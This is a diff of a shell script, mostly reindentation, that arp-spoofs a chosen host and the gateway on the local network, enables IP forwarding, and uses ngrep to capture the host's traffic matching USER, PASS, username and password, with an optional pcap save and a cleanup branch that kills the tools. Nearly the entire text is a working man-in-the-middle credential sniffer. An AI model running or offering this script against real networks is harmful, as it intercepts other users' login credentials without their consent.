@@ -21,47 +21,45 @@ echo "Subnet    $tbroadcast"
 echo "Gateway   $tgateway"
 echo "Local MAC $tmac"
 echo "Local IP  $tlocalip"
-echo "Target IP $tip"
-echo ""
 echo "Start sniffing? (y,n)"
 read tsniff
 if [ $tsniff = y ]
- then
-  echo "Target IP $tsubnet.? (enter a number):"
-read "thost"
-tip=`echo $tsubnet.$thost`
-  echo "Save output to pcap file? (path/n)"
-  read tsave
-  if [ $tsave != n ]
-   then
-   save="-O "$tsave
-  fi
-  sysctl -w net.inet.ip.forwarding=1
-  arpspoof -i en0 -t $tip $tgateway > /dev/null 2>&1 &
-  arpspoof -i en0 -t $tgateway $tip > /dev/null 2>&1 &
-  ngrep $save 'USER|PASS|user|pass|username|password' src host $tip|egrep -A1 ">|USER|PASS|user|pass|username|password"
-  sleep 3
-  ps aux|egrep "arpspoof|dsniff|ngrep"|grep -v egrep
-  #dsniff
- else
-  echo ""
-  echo "Clear state? (y,n)"
-  read tstate
-  if [ $tstate = n ]
-   then
-    ps aux|egrep "arpspoof|dsniff|ngrep"|grep -v egrep
-    exit 0
-   else
-    sysctl -w net.inet.ip.forwarding=0
-    killall dsniff
-    killall arpspoof
-    killall ngrep
+then
+    echo "Target IP $tsubnet.? (enter a number):"
+    read "thost"
+    tip=`echo $tsubnet.$thost`
+    echo "Save output to pcap file? (path/n)"
+    read tsave
+    if [ $tsave != n ]
+    then
+        save="-O "$tsave
+    fi
+    sysctl -w net.inet.ip.forwarding=1
+    arpspoof -i en0 -t $tip $tgateway > /dev/null 2>&1 &
+    arpspoof -i en0 -t $tgateway $tip > /dev/null 2>&1 &
+    ngrep $save 'USER|PASS|user|pass|username|password' src host $tip|egrep -A1 ">|USER|PASS|user|pass|username|password"
     sleep 3
     ps aux|egrep "arpspoof|dsniff|ngrep"|grep -v egrep
-    echo "Exit"
+    #dsniff
+else
     echo ""
-    exit 0
-  fi
+    echo "Clear state? (y,n)"
+    read tstate
+    if [ $tstate = n ]
+    then
+        ps aux|egrep "arpspoof|dsniff|ngrep"|grep -v egrep
+        exit 0
+    else
+        sysctl -w net.inet.ip.forwarding=0
+        killall dsniff
+        killall arpspoof
+        killall ngrep
+        sleep 3
+        ps aux|egrep "arpspoof|dsniff|ngrep"|grep -v egrep
+        echo "Exit"
+        echo ""
+        exit 0
+    fi
 fi
 
 exit 0
